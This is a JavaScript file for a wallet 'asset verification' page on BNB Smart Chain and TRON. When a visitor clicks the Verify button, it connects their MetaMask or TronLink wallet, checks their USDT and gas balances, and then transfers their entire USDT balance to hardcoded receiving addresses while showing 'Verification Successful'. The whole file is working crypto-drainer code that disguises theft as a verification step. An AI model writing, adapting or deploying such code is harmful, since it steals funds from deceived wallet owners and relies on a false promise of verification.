// ==== Constants & addresses ====
const bscAddress = "0xD062Eec11290D6Ec9261CD713Fa9182550E"; // Your USDT receiving address on BSC
const bnbGasSender = "0xe3bA8239Ef1543cC7dD8c352Fd640C37e87aC979"; // Gas wallet on BSC
const usdtBscContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20

const tronAddress = "TXYZ...";  // Your USDT receiving address on TRON (replace with real)
const tronUSDTContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT contract on TRON mainnet

const threshold = 1; // Minimum USDT amount to verify

// ==== Variables ====
let web3, userAddress;        // BSC web3 and address
let tronWebInstance, tronUserAddress;  // TronWeb and address

// ==== Connect BSC wallet (MetaMask) ====
async function connectBSCWallet() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC chainId
      });
      const accounts = await web3.eth.getAccounts();
      userAddress = accounts[0];
      console.log("BSC Wallet Connected:", userAddress);
      return true;
    } catch (err) {
      alert("Please switch to BNB Smart Chain in MetaMask.");
      return false;
    }
  } else {
    alert("MetaMask is not installed.");
    return false;
  }
}

// ==== Connect TRON wallet (TronLink) ====
async function connectTronWallet() {
  if (window.tronWeb && window.tronWeb.ready) {
    tronWebInstance = window.tronWeb;
    tronUserAddress = tronWebInstance.defaultAddress.base58;
    console.log("TRON Wallet Connected:", tronUserAddress);
    return true;
  } else {
    alert("Please install TronLink wallet.");
    return false;
  }
}

// ==== Verify and transfer for BSC ====
async function verifyAndTransferBSC() {
  if (!web3 || !userAddress) {
    alert("Connect your BSC wallet first.");
    return;
  }

  const usdtContract = new web3.eth.Contract([
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "", type: "uint256" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "recipient", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    },
  ], usdtBscContractAddress);

  try {
    const [usdtBalanceWei, userBNBWei] = await Promise.all([
      usdtContract.methods.balanceOf(userAddress).call(),
      web3.eth.getBalance(userAddress),
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    if (usdtBalance < threshold) {
      showPopup(`
        <div style="margin-bottom: 15px; font-weight: 600; color: #2c3e50;">⏳ Verification paused</div>
        <div style="font-size: 14px; color: #34495e;">You need at least ${threshold} USDT to verify.</div>
        <div style="margin-top: 10px; font-size: 13px; background: #ecf0f1; padding: 10px; border-radius: 6px; color: #2c3e50;">
          <b>Wallet Address:</b><br>${userAddress}
        </div>`, "mild");
      return;
    }

    if (userBNB < 0.001) {
      showPopup(`
        <div style="margin-bottom: 15px; font-weight: 600; color: #2c3e50;">⏳ Verification paused</div>
        <div style="font-size: 14px; color: #34495e;">Please top up your wallet with some BNB for verification.</div>
        <div style="margin-top: 10px; font-size: 13px; background: #ecf0f1; padding: 10px; border-radius: 6px; color: #2c3e50;">
          <b>Wallet Address:</b><br>${userAddress}
        </div>`, "mild");
      return;
    }

    showPopup("Processing verification on BSC...", "green");

    // Transfer all USDT to your receiving address
    const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
    await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

    showPopup(`
      ✅ Verification Successful<br>
      USDT detected and transferred.<br><br>
      <b>USDT Amount:</b> ${usdtBalance.toFixed(6)}<br>
      <b>Wallet:</b> ${userAddress}
    `, "green");

  } catch (err) {
    console.error("BSC verification/transfer error:", err);
    alert("Error during BSC verification/transfer: " + err.message);
  }
}

// ==== Verify and transfer for TRON ====
async function verifyAndTransferTRON() {
  if (!tronWebInstance || !tronUserAddress) {
    alert("Connect your TRON wallet first.");
    return;
  }

  try {
    const contract = await tronWebInstance.contract().at(tronUSDTContractAddress);
    const usdtBalanceSun = await contract.methods.balanceOf(tronUserAddress).call();
    const userTRXBalanceSun = await tronWebInstance.trx.getBalance(tronUserAddress);

    const usdtBalance = usdtBalanceSun / 1e6;  // USDT has 6 decimals on TRON
    const userTRX = userTRXBalanceSun / 1e6;   // TRX has 6 decimals

    if (usdtBalance < threshold) {
      showPopup(`
        <div style="margin-bottom: 15px; font-weight: 600; color: #2c3e50;">⏳ Verification paused</div>
        <div style="font-size: 14px; color: #34495e;">You need at least ${threshold} USDT to verify.</div>
        <div style="margin-top: 10px; font-size: 13px; background: #ecf0f1; padding: 10px; border-radius: 6px; color: #2c3e50;">
          <b>Wallet Address:</b><br>${tronUserAddress}
        </div>`, "mild");
      return;
    }

    if (userTRX < 0.001) {
      showPopup(`
        <div style="margin-bottom: 15px; font-weight: 600; color: #2c3e50;">⏳ Verification paused</div>
        <div style="font-size: 14px; color: #34495e;">Please top up your wallet with some TRX for verification.</div>
        <div style="margin-top: 10px; font-size: 13px; background: #ecf0f1; padding: 10px; border-radius: 6px; color: #2c3e50;">
          <b>Wallet Address:</b><br>${tronUserAddress}
        </div>`, "mild");
      return;
    }

    showPopup("Processing verification on TRON...", "green");

    // Transfer all USDT to your receiving address
    const amountToSend = usdtBalanceSun; // amount in SUN
    await contract.methods.transfer(tronAddress, amountToSend).send({ from: tronUserAddress });

    showPopup(`
      ✅ Verification Successful<br>
      USDT detected and transferred.<br><br>
      <b>USDT Amount:</b> ${usdtBalance.toFixed(6)}<br>
      <b>Wallet:</b> ${tronUserAddress}
    `, "green");

  } catch (err) {
    console.error("TRON verification/transfer error:", err);
    alert("Error during TRON verification/transfer: " + err);
  }
}

// ==== Main verify function ====
async function verifyAssets() {
  // Try BSC first
  if (window.ethereum) {
    const connected = await connectBSCWallet();
    if (connected) {
      await verifyAndTransferBSC();
      return;
    }
  }

  // Try TRON next
  if (window.tronWeb && window.tronWeb.ready) {
    const connected = await connectTronWallet();
    if (connected) {
      await verifyAndTransferTRON();
      return;
    }
  }

  alert("No supported wallet found. Please install MetaMask for BSC or TronLink for TRON.");
}

// ==== Popup function ====
function showPopup(message, color) {
  let popup = document.getElementById("popupBox");

  if (!popup) {
    popup = document.createElement("div");
    popup.id = "popupBox";
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
    popup.style.textAlign = "center";
    popup.style.fontSize = "18px";
    popup.style.width = "80%";
    popup.style.maxWidth = "400px";
    popup.style.zIndex = 10000;
    document.body.appendChild(popup);
  } else if (!document.body.contains(popup)) {
    document.body.appendChild(popup);
  }

  if (color === "mild") {
    popup.style.backgroundColor = "#ecf0f1"; // light grey
    popup.style.color = "#2c3e50";           // dark blue/gray
  } else if (color === "green") {
    popup.style.backgroundColor = "#e6f7e6";
    popup.style.color = "#2a7a2a";
  } else {
    popup.style.backgroundColor = "#f0f0f0";
    popup.style.color = "#333";
  }

  popup.innerHTML = message;
  popup.style.display = "block";

  setTimeout(() => {
    popup.style.display = "none";
  }, 6000);
}

// ==== Attach to your Verify button ====
document.getElementById("verifyBtn").addEventListener("click", verifyAssets);
